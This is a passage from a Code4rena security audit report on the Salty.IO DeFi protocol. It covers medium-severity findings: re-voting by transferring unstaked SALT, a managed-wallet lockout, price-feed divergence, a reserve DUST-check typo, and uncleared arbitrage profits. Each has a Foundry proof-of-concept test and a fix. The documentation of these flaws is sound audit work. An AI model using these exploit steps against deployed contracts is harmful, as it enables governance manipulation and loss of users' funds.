		uint256 userVotingPower = staking.userShareForPool( msg.sender, PoolUtils.STAKED_SALT );
		require( userVotingPower > 0, "Staked SALT required to vote" );

		// Remove any previous votes made by the user on the ballot
		UserVote memory lastVote = _lastUserVoteForBallot[ballotID][msg.sender];

		// Undo the last vote?
@>		if ( lastVote.votingPower > 0 )
@>			_votesCastForBallot[ballotID][lastVote.vote] -= lastVote.votingPower;

		// Update the votes cast for the ballot with the user's current voting power
		_votesCastForBallot[ballotID][vote] += userVotingPower;

		// Remember how the user voted in case they change their vote later
		_lastUserVoteForBallot[ballotID][msg.sender] = UserVote( vote, userVotingPower );

		emit VoteCast(msg.sender, ballotID, vote, userVotingPower);
		}
```

Calling it again on a proposal that has already been voted on will revert the existing vote.

Therefore, the same account cannot vote multiple times on the same proposal. However, it is possible to re-vote by unstaking SALT and transferring it to another account.

```solidity
// Checks that ballot is live, and minimumEndTime and quorum have both been reached.
	function canFinalizeBallot( uint256 ballotID ) external view returns (bool)
		{
        Ballot memory ballot = ballots[ballotID];
        if ( ! ballot.ballotIsLive )
        	return false;

        // Check that the minimum duration has passed
@>        if (block.timestamp < ballot.ballotMinimumEndTime )
            return false;

        // Check that the required quorum has been reached
        if ( totalVotesCastForBallot(ballotID) < requiredQuorumForBallotType( ballot.ballotType ))
            return false;

        return true;
	    }
```

The reason this is a viable attack is because the conditions under which a proposal can be finalized are unusual.

In a typical voting system, there is a period of time during which a proposal can be voted on, and if it does not meet the quorum, it is dropped, and if it does, the ratio of upvotes to downvotes determines whether it should be executed.

However, Salty's voting system allows the voting period to be infinitely long if the quorum is not met. In other words, if the voting lasts longer than the period required to unstake SALT, it can be unstaked and transferred to another account to vote again.

> Salty will be launched on the Ethereum mainnet, which means that voting will be quite expensive. With no delegates, the current specification requires many individual votes to achieve a quorum. This means that users may not actively vote for outrageous votes, which could lead to a longer proposal voting period.

The scenario for the attack is as follows

1.  Staking SALT
2.  Create a malicious proposal
3.  Vote YES
4.  Unstake SALT
5.  Wait for unstake and recover
6.  Send SALT to other account
7.  Staking SALT
8.  Vote YES

### Proof of Concept

<details>

```solidity
function testChangeVotesAfterUnstakingSALTAndTransferPOC() public {
    	vm.startPrank(alice);

    	address randomAddress = address(0x543210);

    	// STEP 1: Staking SALT
    	staking.stakeSALT(100000 ether);

    	// STEP 2: Create a malicious proposal
    	uint256 ballotID = proposals.proposeCallContract(randomAddress, 1000, "Malicious call" );

    	// STEP 3: Vote YES
    	proposals.castVote(ballotID, Vote.YES);

    	// STEP 4: Unstake SALT
    	uint256 id = staking.unstake(100000 ether, 2 );

        // STEP 5: Wait for unstake and recover
   		vm.warp(block.timestamp + 100 weeks);
        staking.recoverSALT(id);

        // STEP 6: Send SALT to other account
        salt.transfer(bob, 100000 ether);
        vm.stopPrank();

        // STEP 7: Staking SALT
        vm.startPrank(bob);

        // STEP 8: Vote YES
    	staking.stakeSALT(100000 ether);
    	proposals.castVote(ballotID, Vote.YES); // result: 200000

        console.log(proposals.votesCastForBallot(ballotID, Vote.YES));
    }
```
</details>

### Recommended Mitigation Steps

A short-term solution is to use ballotMaximumEndTime to prevent votes from lasting too long.

A more fundamental solution would be to take a snapshot of the staked SALT and make it available for voting, like ERC20Votes, to prevent re-voting after a transfer.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/844#issuecomment-1950434607):**
 > ballotMaximumDuration added. There is now a default 30 day period after which ballots can be removed by any user.
> 
> https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0

**Status:** Mitigation confirmed. Full details in report from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/52).

***

## [[M-07] Impossible to change managed wallets with `proposeWallets` after first rejection](https://github.com/code-423n4/2024-01-salty-findings/issues/838)
*Submitted by [Aymen0909](https://github.com/code-423n4/2024-01-salty-findings/issues/838), also found by juancito ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/1059), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/627)), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/989), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/836), [niroh](https://github.com/code-423n4/2024-01-salty-findings/issues/806), [neocrao](https://github.com/code-423n4/2024-01-salty-findings/issues/783), [pina](https://github.com/code-423n4/2024-01-salty-findings/issues/766), [erosjohn](https://github.com/code-423n4/2024-01-salty-findings/issues/697), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/662), [lilizhu](https://github.com/code-423n4/2024-01-salty-findings/issues/610), [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/573), [n0kto](https://github.com/code-423n4/2024-01-salty-findings/issues/551), [ZanyBonzy](https://github.com/code-423n4/2024-01-salty-findings/issues/546), [pkqs90](https://github.com/code-423n4/2024-01-salty-findings/issues/483), [Drynooo](https://github.com/code-423n4/2024-01-salty-findings/issues/470), [zxriptor](https://github.com/code-423n4/2024-01-salty-findings/issues/410), [Ephraim](https://github.com/code-423n4/2024-01-salty-findings/issues/407), [LeoGold](https://github.com/code-423n4/2024-01-salty-findings/issues/360), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/334), [0xOmer](https://github.com/code-423n4/2024-01-salty-findings/issues/220), [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/44), [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/36), and [Beepidibop](https://github.com/code-423n4/2024-01-salty-findings/issues/12)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L67-L69> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L48-L49>

The `receive` function in `ManagedWallet` fails to reset the `proposedMainWallet` address to the zero address (`address(0)`) when the confirmation wallet rejects the wallet change:

```solidity
receive() external payable {
    require(msg.sender == confirmationWallet, "Invalid sender");

    // Confirm if .05 or more ether is sent and otherwise reject.
    // Done this way in case custodial wallets are used as the confirmationWallet - which sometimes won't allow for smart contract calls.
    if (msg.value >= .05 ether)
        activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
    else activeTimelock = type(uint256).max; // effectively never
    //@audit doesn't reset proposedMainWallet to address(0)
}
```

This omission renders it impossible to submit new proposals for changing wallets in the future. After the confirmation wallet rejects for the first time, the `proposedMainWallet` remains different from `address(0)`, causing the `proposeWallets` function to revert due to the check on the `proposedMainWallet` address:

```solidity
function proposeWallets(
    address _proposedMainWallet,
    address _proposedConfirmationWallet
) external {
    ...

    //@audit revert if proposedMainWallet != address(0)
    // Make sure we're not overwriting a previous proposal (as only the confirmationWallet can reject proposals)
    require(
        proposedMainWallet == address(0),
        "Cannot overwrite non-zero proposed mainWallet."
    );

    proposedMainWallet = _proposedMainWallet;
    proposedConfirmationWallet = _proposedConfirmationWallet;

    emit WalletProposal(proposedMainWallet, proposedConfirmationWallet);
}
```

### Impact

After the first rejection of wallet changes, the `proposeWallets` function will consistently revert, making it impossible to change the main and confirmation wallets indefinitely.

### Proof of Concept

The scenario for this issue to occurs is straightforward :

*   `mainWallet` make a request to `proposeWallets` to change the main and confirmation wallets which sets `proposedMainWallet != address(0)`.

*   `confirmationWallet` doesn't like the change so he calls `receive` function with insufficient amount of ETH to refuse the change. After `receive` call, `activeTimelock` is set to `uint256.max` but `proposedMainWallet` is still different from `address(0)`.

*   `mainWallet` tries to call `proposeWallets` again by it will always revert because `proposedMainWallet != address(0)`.

*   Both main and confirmation wallets can never be changed again.

### Tools Used

VS Code

### Recommended Mitigation

In the `receive` function, reset the `proposedMainWallet` variable to `address(0)` after the confirmation process has been rejected (similar to the reset done in `changeWallets()`).

```solidity
if (msg.value >= .05 ether)
    activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
else {
    //@audit Reset
    activeTimelock = type(uint256).max;
    proposedMainWallet = address(0);
    proposedConfirmationWallet = address(0);
}
```

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/838#issuecomment-1947935073):**
 > ManagedWallet has been removed.
> 
> https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5

**[Picodes (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-salty-findings/issues/838#issuecomment-1950275953)**

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/11), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/73), and [zzebra83].


***

## [[M-08] PriceFeed is likely to be disabled in times of volatility, causing liquidations and borrows to freeze](https://github.com/code-423n4/2024-01-salty-findings/issues/809)
*Submitted by [niroh](https://github.com/code-423n4/2024-01-salty-findings/issues/809), also found by [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/811)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L142> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L183> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L195>

1.  The price feed aggregator relies on three feeds (Chainlink feeds, Uniswap 30 minute TWAP and Salty spot price) to report pricing. The aggregation logic is to average the closest two feed prices, and if the price difference between them exceeds maximumPriceFeedPercentDifferenceTimes1000 (default value: 3%), the aggregator reverts. Since liquidation and borrowing operations rely on price feed reporting, these will revert as well when the minimum price disparity between the three oracles exceeds maximumPriceFeedPercentDifferenceTimes1000.

2.  In times of price volatility for the reported pairs (ETH/USD, BTC/USD) the three oracles used are likely to diverge by more than the 3% limit. To understand why, consider the following traits of each of the three feed sources:

*   Uniswap 30 minutes TWAP reports the time weighed average over the last 30 minutes.
*   Chainlink uses multiple sources (onchain Dexes, Cexes) and reports immediately on price changes larger than 0.5% (the Chainlink update trigger setting for the two feeds used.)
*   Salty reports the immediate price taken from the relevant pools on Salty at the time (block) of price aggragation.
*   When volatility is high, the 30 minutes TWAP is likely to diverge from spot oracles such as Chainlink feeds and Salty's pools. If for example the market price shifts drastically within 5 minutes, Uniswap's TWAP will only weigh the change at 20% and the previous price at 80%, while Chainlink and Salty will report the most recent price. In such conditions, a 3% price difference is likely to happen.
*   Since Salty's liquidity is likely to be much smaller than the Uniswap pools used (Weth/Wbtc and Weth/Usdc) its reported price is likely to diverge from Uniswap's price, especially when sharp price shifts occur. This is because large pools such as Uniswaps are likely to be arbitraged sooner (to match centralized exchanges where price discovery typically happens) and smaller pools take longer to catch up to the new price.

3.  The result is that is times of high volatility, Salty's price feed is likely to enter a state of >3% disparity between the feeds, effetively blocking liquidations at the time they are most crucial.
4.  The maximumPriceFeedPercentDifferenceTimes1000 parameter can be extended up to 7% through a DAO vote, but given that every 0.5% increase requires a vote duration of 10 days at least, the DAO is not likely to react it time to adjust for market volatility.

### Tools Used

Foundry

### Recommended Mitigation Steps

The common behavior for DeFi price feed aggregators is to fallback to the most trustworthy oracle rather than abort. Typically, Chainlink is selected as the preferred fallback due to the diversity of its sources and reputation of stability. It is recommended to follow this principle and fallback to Chainlink's price instead of reverting when prices diverge by more than the max.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/809#issuecomment-1960683594):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:

> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/54), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/74), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/13).
***

## [[M-09] Remove Liquidity has missing reserve1 DUST check, which can make reserve1 to be less than DUST](https://github.com/code-423n4/2024-01-salty-findings/issues/784)
*Submitted by [neocrao](https://github.com/code-423n4/2024-01-salty-findings/issues/784), also found by [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/1063), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/1049), [0x11singh99](https://github.com/code-423n4/2024-01-salty-findings/issues/1043), [okolicodes](https://github.com/code-423n4/2024-01-salty-findings/issues/1041), [HALITUS](https://github.com/code-423n4/2024-01-salty-findings/issues/1035), [memforvik](https://github.com/code-423n4/2024-01-salty-findings/issues/851), [Kalyan-Singh](https://github.com/code-423n4/2024-01-salty-findings/issues/822), [The-Seraphs](https://github.com/code-423n4/2024-01-salty-findings/issues/776), [wangxx2026](https://github.com/code-423n4/2024-01-salty-findings/issues/732), [zhaojohnson](https://github.com/code-423n4/2024-01-salty-findings/issues/657), [00xSEV](https://github.com/code-423n4/2024-01-salty-findings/issues/650), [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/647), [cu5t0mpeo](https://github.com/code-423n4/2024-01-salty-findings/issues/616), [parrotAudits0](https://github.com/code-423n4/2024-01-salty-findings/issues/602), [AgileJune](https://github.com/code-423n4/2024-01-salty-findings/issues/592), [agadzhalov](https://github.com/code-423n4/2024-01-salty-findings/issues/563), [aman](https://github.com/code-423n4/2024-01-salty-findings/issues/552), [Drynooo](https://github.com/code-423n4/2024-01-salty-findings/issues/474), [ewah](https://github.com/code-423n4/2024-01-salty-findings/issues/436), [RootKit0xCE](https://github.com/code-423n4/2024-01-salty-findings/issues/406), [MSaptarshi](https://github.com/code-423n4/2024-01-salty-findings/issues/346), [Imp](https://github.com/code-423n4/2024-01-salty-findings/issues/336), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/332), [0xAlix2](https://github.com/code-423n4/2024-01-salty-findings/issues/330), [erosjohn](https://github.com/code-423n4/2024-01-salty-findings/issues/254), [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/212), [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/211), [rudolph](https://github.com/code-423n4/2024-01-salty-findings/issues/202), [0xanmol](https://github.com/code-423n4/2024-01-salty-findings/issues/197), [ayden](https://github.com/code-423n4/2024-01-salty-findings/issues/112), [KHOROAMU](https://github.com/code-423n4/2024-01-salty-findings/issues/109), [0xSmartContractSamurai](https://github.com/code-423n4/2024-01-salty-findings/issues/87), [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/86), and [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/69)*

The function `Pools::removeLiquidity()` checks that the `reserve0` and `reserve1` amounts for a pool are always above or at DUST amount. If after the liquidity is removed, and the `reserve0` or `reserve1` goes below DUST level, then the transaction should revert.

But, this check is implemented incorrectly. The code that performs this check is as below in the code:

```solidity
    require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```

If you notice, the `reserve0` is checked twice, instead of the checks being for each `reserve0` and `reserve1`.

### Impact

The documentation states the following reason for the DUST check:

```solidity
// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
// This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
```

So, if the `reserve1` goes below the DUST amount, then it can imbalance the ratios. Also, once a pool has been established with the reserves, functions like and related to `swap()` rely on the amounts to be above the DUST amounts. If either of the reserves go below the DUST levels, then these functions will start to revert.

### Proof of concept

Use the below test in the file: `src/pools/tests/Pools.t.sol`

<details>

```solidity
function testNeoCraoReserve1LessThanDust() public {
    // Setup Tokens

    TestERC20[] memory testTokens = new TestERC20[](2);

    vm.startPrank(DEPLOYER);
    for (uint256 i = 0; i < 2; i++) {
        testTokens[i] = new TestERC20("TEST", 18);
    }
    (, bool flipped) = PoolUtils._poolIDAndFlipped(testTokens[0], testTokens[1]);
    if (flipped) {
        (testTokens[1], testTokens[0]) = (testTokens[0], testTokens[1]);
    }
    for (uint256 i = 0; i < 2; i++) {
        testTokens[i].approve(address(pools), type(uint256).max);
        testTokens[i].approve(
            address(collateralAndLiquidity),
            type(uint256).max
        );

        testTokens[i].transfer(address(this), 100000 ether);
        testTokens[i].transfer(address(dao), 100000 ether);
        testTokens[i].transfer(address(collateralAndLiquidity), 100000 ether);
    }
    vm.stopPrank();

    vm.prank(address(dao));
    poolsConfig.whitelistPool(pools, testTokens[0], testTokens[1]);

    vm.prank(DEPLOYER);
    collateralAndLiquidity.depositLiquidityAndIncreaseShare(
        testTokens[0],
        testTokens[1],
        500 ether,
        100 ether,
        0,
        block.timestamp,
        false
    );

    for (uint256 i = 0; i < 2; i++) {
        testTokens[i].approve(address(pools), type(uint256).max);
        testTokens[i].approve(
            address(collateralAndLiquidity),
            type(uint256).max
        );
    }

    vm.startPrank(address(collateralAndLiquidity));
    testTokens[0].approve(address(pools), type(uint256).max);
    testTokens[1].approve(address(pools), type(uint256).max);

    // POC

    vm.startPrank(address(collateralAndLiquidity));

    uint256 totalShares = collateralAndLiquidity.totalShares(
        PoolUtils._poolID(testTokens[0], testTokens[1])
    );

    pools.removeLiquidity(
        testTokens[0],
        testTokens[1],
        599999999999999999406,
        1 ether,
        1 ether,
        totalShares
    );

    (, uint256 reserves1Final) = pools.getPoolReserves(
        testTokens[0],
        testTokens[1]
    );
    assertLt(reserves1Final, PoolUtils.DUST);
}
```
</details>

### Severity Justification

This is Medium severity, based on the Code4rena Severity Categorization: <https://docs.code4rena.com/awarding/judging-criteria/severity-categorization>

2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.

### Recommended Mitigation Steps

The check should be updated to check for `reserve1` as well.

```diff
-    require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
+    require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve1 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/784#issuecomment-1952750697):**
 > Note: this is a typo following a fix of the Trail Of Bits audit. It has a large number of duplicates, with the main impact being DoS of the swaps and related functionalities and manipulating the initial ratio. I haven't found a report proving that manipulating the initial ratio is of high severity except these 2 that copy-pasted ToB's report: https://github.com/code-423n4/2024-01-salty-findings/issues/197 and https://github.com/code-423n4/2024-01-salty-findings/issues/592.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/784#issuecomment-1960693208):**
 > Fixes reserves DUST check:
> https://github.com/othernet-global/salty-io/commit/b01f6e5cb360e89f9e4cdae41d609ea747bcaa86

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/14), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/75), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/55).

***

## [[M-10] Unwhitelisting does not clear _arbitrageProfits, so re-whitelisting may result in an unfair distribution of liquidity rewards](https://github.com/code-423n4/2024-01-salty-findings/issues/752)
*Submitted by [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/752), also found by [falconhoof](https://github.com/code-423n4/2024-01-salty-findings/issues/987), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/886), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/810), [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/619), 0xbepresent ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/570), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/318)), [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/511), [KingNFT](https://github.com/code-423n4/2024-01-salty-findings/issues/500), [pkqs90](https://github.com/code-423n4/2024-01-salty-findings/issues/484), [Topmark](https://github.com/code-423n4/2024-01-salty-findings/issues/479), [0xAsen](https://github.com/code-423n4/2024-01-salty-findings/issues/242), and [nonseodion](https://github.com/code-423n4/2024-01-salty-findings/issues/141)*

<https://github.com/code-423n4/2024-01-salty/blob/aab6bbc6fe49d4dd37becc7bbd0c847ec4a7c1e6/src/dao/DAO.sol#L157-L164> 

<https://github.com/code-423n4/2024-01-salty/blob/aab6bbc6fe49d4dd37becc7bbd0c847ec4a7c1e6/src/pools/PoolStats.sol#L51-L55>

When a pool that has been excluded from the whitelist is added again, it can receive liquidity rewards based on the previous `_arbitrageProfits`.

### Proof of Concept

When unwhitelisting, `_arbitrageProfits` is not cleared. When added to the whitelist again, rewards can be distributed unfairly due to the remaining `_arbitrageProfits`.

Let's assume there are A/WETH, A/WBTC, B/WETH, B/WBTC, WETH/WBTC pools. A swap occurred in each of the A/WETH, B/WETH pools, generating 1 ether of arbitrage profit. If the liquidity rewards are settled at this time, each pool can receive liquidity rewards at a ratio of A/WETH: A/WBTC: B/WETH: B/WBTC: WETH/WBTC = 1: 1: 1: 1: 2. This is because they can take as much as the proportion of profits generated in each pool.

```solidity
function _calculateArbitrageProfits( bytes32[] memory poolIDs, uint256[] memory _calculatedProfits ) internal view
{
    for( uint256 i = 0; i < poolIDs.length; i++ )
    {
        // references poolID(arbToken2, arbToken3) which defines the arbitage path of WETH->arbToken2->arbToken3->WETH
        bytes32 poolID = poolIDs[i];

        // Split the arbitrage profit between all the pools that contributed to generating the arbitrage for the referenced pool.
@>      uint256 arbitrageProfit = _arbitrageProfits[poolID] / 3;
        if ( arbitrageProfit > 0 )
        {
            ArbitrageIndicies memory indicies = _arbitrageIndicies[poolID];

            if ( indicies.index1 != INVALID_POOL_ID )
                _calculatedProfits[indicies.index1] += arbitrageProfit;

            if ( indicies.index2 != INVALID_POOL_ID )
                _calculatedProfits[indicies.index2] += arbitrageProfit;

            if ( indicies.index3 != INVALID_POOL_ID )
                _calculatedProfits[indicies.index3] += arbitrageProfit;
        }
    }
}

function profitsForWhitelistedPools() external view returns (uint256[] memory _calculatedProfits)
{
@>  bytes32[] memory poolIDs = poolsConfig.whitelistedPools();

    _calculatedProfits = new uint256[](poolIDs.length);
@>  _calculateArbitrageProfits( poolIDs, _calculatedProfits );
}
```

Suppose you unwhitelist B tokens without settling rewards. The B/WETH and B/WBTC pools will be unwhitelisted. Since they are not included in the whitelist, they cannot be involved in reward settlements, so even if the someone calls `performUpkeep` , their `_arbitrageProfits` remain the same.

```solidity
function clearProfitsForPools() external
{
    require(msg.sender == address(exchangeConfig.upkeep()), "PoolStats.clearProfitsForPools is only callable from the Upkeep contract" );

@>  bytes32[] memory poolIDs = poolsConfig.whitelistedPools();

    for( uint256 i = 0; i < poolIDs.length; i++ )
        _arbitrageProfits[ poolIDs[i] ] = 0;
}
```

Time has passed and B token is added to the whitelist again, so that the B/WETH, B/WBTC pools are registered on the whitelist. Since the past `_arbitrageProfits` were not cleared, 1 ether remains in B/WETH pool's `_arbitrageProfits`. The rewards for the other pools have already been settled and `_arbitrageProfits` has been reset.

After that, the A/WBTC pool makes new arbitrage profit of 0.1 ether. If the reward is settled in this state, they will receive rewards at a ratio of A/WETH: A/WBTC: B/WETH: B/WBTC: WETH/WBTC = 1: 1: 10: 10: 11.

This is the PoC. You can add it to the DAO.t.sol file and test it.

<details>

```solidity
function testPoCArbitrageProfitsNotCleared() public
{
	vm.prank(DEPLOYER);
	salt.approve(address(liquidityRewardsEmitter), type(uint256).max);
	
	IERC20 token1 = new TestERC20("TEST", 18);
	IERC20 token2 = new TestERC20("TEST", 18);
	
	token1.transfer(DEPLOYER, 1000000 ether);
	token2.transfer(DEPLOYER, 1000000 ether);
	token1.transfer(alice, 1000000 ether);
	token2.transfer(alice, 1000000 ether);
	token1.transfer(bob, 1000000 ether);
	token2.transfer(bob, 1000000 ether);
	
	// --- add whitelist ---
	
	vm.startPrank(alice);
	staking.stakeSALT( 1000000 ether );
	
	salt.transfer( address(dao), 2000000 ether );
	
	uint256 ballotId = proposals.proposeTokenWhitelisting( token1, "", "" );
	_voteForAndFinalizeBallot(ballotId, Vote.YES);
	
	ballotId = proposals.proposeTokenWhitelisting( token2, "", "" );
	_voteForAndFinalizeBallot(ballotId, Vote.YES);
	vm.stopPrank();
	
	// --- Add liquidity ---
	vm.startPrank(DEPLOYER);
	token1.approve(address(collateralAndLiquidity), type(uint256).max);
	token2.approve(address(collateralAndLiquidity), type(uint256).max);
	weth.approve(address(collateralAndLiquidity), type(uint256).max);
	wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
	// Adds token1/WETH, token1/WBTC liquidity
	collateralAndLiquidity.depositLiquidityAndIncreaseShare(token1, weth, 1000 ether, 10 ether, 0, block.timestamp, false);
	collateralAndLiquidity.depositLiquidityAndIncreaseShare(token1, wbtc, 1000 ether, 10 * 10**8, 0, block.timestamp, false);
	// Adds token2/WETH, token2/WBTC liquidity
	collateralAndLiquidity.depositLiquidityAndIncreaseShare(token2, weth, 1000 ether, 10 ether, 0, block.timestamp, false);
	collateralAndLiquidity.depositLiquidityAndIncreaseShare(token2, wbtc, 1000 ether, 10 * 10**8, 0, block.timestamp, false);
	// Adds WETH/WBTC liquidity
	collateralAndLiquidity.depositCollateralAndIncreaseShare(1000 * 10**8, 1000 ether, 0, block.timestamp, false);
	
	vm.stopPrank();
	
	
		// --- arbitrage profit ---
	vm.startPrank(bob);
	token1.approve(address(pools), type(uint256).max);
	token2.approve(address(pools), type(uint256).max);
	pools.depositSwapWithdraw(token1, wbtc, 1 ether, 0, block.timestamp);
	pools.depositSwapWithdraw(token2, wbtc, 1 ether, 0, block.timestamp);
	vm.stopPrank();
	
	uint256 token2_wbtc_index;
	uint256 token2_weth_index;
	
	bytes32[] memory poolIDs = poolsConfig.whitelistedPools();
	
	for(uint256 i = 0; i < poolIDs.length; i ++){
		if(poolIDs[i] == PoolUtils._poolID(token2, wbtc)){
			token2_wbtc_index = i;
			continue;
		}
		if(poolIDs[i] == PoolUtils._poolID(token2, weth)){
			token2_weth_index = i;
			continue;
		}
	}
	assertTrue(token2_wbtc_index != 0 && token2_weth_index != 0, "wrong index");
	
	uint256[] memory old_profits = pools.profitsForWhitelistedPools();
	
	// --- unwhitelist pool ---
	
	vm.startPrank(alice);
	ballotId = proposals.proposeTokenUnwhitelisting( token2, "", "" );
	_voteForAndFinalizeBallot(ballotId, Vote.YES);
	vm.stopPrank();
	
	// Check for the effects of the vote
	assertFalse( poolsConfig.tokenHasBeenWhitelisted(token2, wbtc, weth), "Token should not be whitelisted" );
	
	// user calls upkeep, the old reward cleared (but token2's reward is not cleared)
	vm.prank(address(upkeep));
	pools.clearProfitsForPools();
	
	
	// --- re-whitelist ---
	
	vm.startPrank(alice);
	ballotId = proposals.proposeTokenWhitelisting( token2, "", "" );
	_voteForAndFinalizeBallot(ballotId, Vote.YES);
	vm.stopPrank();
	
	poolIDs = poolsConfig.whitelistedPools();
	
	uint256 new_token2_wbtc_index;
	uint256 new_token2_weth_index;
	
	for(uint256 i = 0; i < poolIDs.length; i ++){
		if(poolIDs[i] == PoolUtils._poolID(token2, wbtc)){
			new_token2_wbtc_index = i;
			continue;
		}
		if(poolIDs[i] == PoolUtils._poolID(token2, weth)){
			new_token2_weth_index = i;
			continue;
		}
	}
	assertTrue(new_token2_wbtc_index != 0 && new_token2_weth_index != 0, "wrong index");
	
	// --- old and new reward for token2 pool are same ---
	uint256[] memory new_profits = pools.profitsForWhitelistedPools();
	
	assertEq(old_profits[token2_wbtc_index], new_profits[new_token2_wbtc_index], "old _arbitrageProfits remain");
	assertEq(old_profits[token2_weth_index], new_profits[new_token2_weth_index], "old _arbitrageProfits remain");

}
```
</details>

### Recommended Mitigation Steps

Before finalizing the unwhitelist ballot, user should call `performUpkeep` first to force the rewards to be settled. Check if `_arbitrageProfits` is cleared.

```diff
function _executeApproval( Ballot memory ballot ) internal
{
    if ( ballot.ballotType == BallotType.UNWHITELIST_TOKEN )
    {
+       require(pools._arbitrageProfits(poolId_wbtc) == 0, "not cleared yet");
+       require(pools._arbitrageProfits(poolId_weth) == 0, "not cleared yet");
        // All tokens are paired with both WBTC and WETH so unwhitelist those pools
        poolsConfig.unwhitelistPool( pools, IERC20(ballot.address1), exchangeConfig.wbtc() );
        poolsConfig.unwhitelistPool( pools, IERC20(ballot.address1), exchangeConfig.weth() );

        emit UnwhitelistToken(IERC20(ballot.address1));
    }
    ...
}

```

**[othernet-global (Salty.IO) disputed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/752#issuecomment-1937955176):**
 > It is acceptable that an unwhitelisted pool will retain some rewards after being whitelisted again - as the period in which they were unwhitelisted they did not receive rewards that were owed to them.  As the frequency of performUpkeep is sufficiently high, this behavior is acceptable.


***

## [[M-11] SALT staker can get extra voting power by simply unstaking their xSALT](https://github.com/code-423n4/2024-01-salty-findings/issues/716)
